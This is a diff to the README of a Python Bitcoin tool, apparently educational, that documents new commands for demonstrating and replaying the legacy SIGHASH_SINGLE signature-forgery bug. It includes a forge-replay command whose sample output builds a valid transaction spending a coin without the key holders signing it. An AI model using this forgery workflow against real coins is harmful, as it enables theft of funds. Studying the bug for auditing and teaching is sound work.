@@ -38,6 +38,11 @@ python -m faketoshi unsigned --input ... --output ...   # then:
 python -m faketoshi signraw --key <hex> --raw <txhex> --prevout <SCRIPT>:<AMOUNT>
 python -m faketoshi decode <txhex>
 
+# The SIGHASH_SINGLE signature-forgery bug
+python -m faketoshi sighash-single-demo      # synthetic: replay a signature
+python -m faketoshi replay-history           # the real BitPay/Copay theft
+python -m faketoshi forge-replay --txid <txid> --value <sats> --to <addr>
+
 # Optionally install the `faketoshi` command
 pip install -e .
 faketoshi
@@ -333,6 +338,65 @@ $ python -m faketoshi decode <that spk as an output>
 output 0: 300000 sats -> 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe
 ```
 
+### Replaying the real theft: `replay-history`
+
+The historical event the bug is famous for is on the chain, and this tool ships
+the transaction itself so you can audit it offline:
+
+```
+$ python -m faketoshi replay-history
+The BitPay/Copay SIGHASH_SINGLE theft
+
+transaction 791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf
+  inputs: 3   outputs: 1
+  5967200 sats (0.05967200 BTC) left 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe for 1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3
+
+why the signatures transferred:
+  legacy SIGHASH_ALL digest would have been 4592914080893051878949606799692956561...
+  legacy SIGHASH_SINGLE digest is the constant 4523128485832663883733241601901871400...
+                                             (uint256::ONE)
+
+signatures harvested (4):
+  input 1: signature 0x03, 72 bytes
+    digest is the uint256::ONE constant: True
+    verifies under multisig key index: [0]
+  input 1: signature 0x03, 71 bytes
+    ...verifies under multisig key index: [1]
+  ...
+```
+
+Those signatures had been produced for a transaction that was never broadcast.
+Because they commit to the constant `2**248` instead of a digest, they were
+valid for **any** transaction spending that coin — so whoever held them could
+sweep the 2-of-3 address, and did. No private key was needed.
+
+`forge-replay` rebuilds such a theft from harvested signatures:
+
+```
+$ python -m faketoshi forge-replay --txid <txid> --value 677200 \
+      --to 1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9
+harvested 4 signature(s) from 791fe035...d0cf
+
+digest in the new transaction: 452312848583266388373324160190187140051835877600158453279131187530910662656
+reassembled scriptSig: 00483045022100dfcfafcea73d83e1...53ae
+valid: yes - the coin can be spent by anyone holding this signature
+txid: 1a052ec7322d7b8feb6c5de3fa2191ede94852920e55df7a4b7b38474bcc900c
+
+This transaction spends the coin without any key holder having signed
+it. It is printed, not broadcast.
+```
+
+The target input must sit at an index with **no matching output** — that is the
+entire precondition. `--from-tx` harvests from a transaction you supply instead
+of the built-in one; signatures that were signed `SIGHASH_ALL` produce nothing,
+because they commit to a real digest.
+
+Verification of the built-in transaction, for what it is worth: its txid hashes
+to the value above, its single output pays `1Lyafe8m…`, the redeem script's
+`hash160` is the victim address, and both signatures verify over `2**248` under
+the third-party `ecdsa` library. `python-bitcointx` refuses to compute the
+digest at all (`outIdx 1 out of range`), which is the modern guard rail.
+
 ⚠️ A note on the reference material: the article it is modelled on
 (`demining/Digital-Signature-Forgery-Attack`) mixes the genuine SIGHASH_SINGLE
 bug with claims about CVE-2025-29774/29775, which are **XML signature
@@ -533,6 +597,7 @@ Signing and transactions are separate from the forgery code:
 | module | contents |
 | --- | --- |
 | `faketoshi/signing.py` | RFC 6979 nonces, `sign_z`/`verify_z`, DER, legacy and BIP143 sighashes, tx parsing/serialisation, `txid`/`wtxid` |
+| `faketoshi/sighash_single.py` | multisig scripts, the bug demo, `harvest_signatures`, `forge_from_harvest`, `replay_history` |
 | `faketoshi/wallet.py` | address ↔ script, WIF, `build_transaction`, `sign_raw_transaction`, `make_unsigned` |
 | `faketoshi/encoding.py` | hashes (incl. pure-Python RIPEMD160 fallback), varints, base58check, bech32 |
 | `faketoshi/blockcypher.py` | BlockCypher client: `unspent_outputs`, `balance`, `push`, `decode`; injectable transport for tests |
